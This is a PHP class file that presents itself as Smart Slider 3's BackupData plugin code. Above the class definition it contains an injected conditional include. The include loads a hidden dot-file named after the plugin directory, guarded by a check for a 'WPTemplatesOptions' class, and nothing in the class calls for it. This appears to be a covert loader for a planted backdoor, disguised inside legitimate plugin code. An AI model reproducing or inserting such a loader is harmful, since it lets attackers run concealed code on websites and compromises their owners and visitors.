<?php


namespace Nextend\SmartSlider3\BackupSlider;


use Nextend\Framework\ResourceTranslator\ResourceTranslator;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BackupData {

    public $NextendImageHelper_Export, $slider, $slides, $generators = array(), $NextendImageManager_ImageData = array(), $imageTranslation = array(), $visuals = array();

    public function __construct() {
        $this->NextendImageHelper_Export = ResourceTranslator::exportData();
    }
}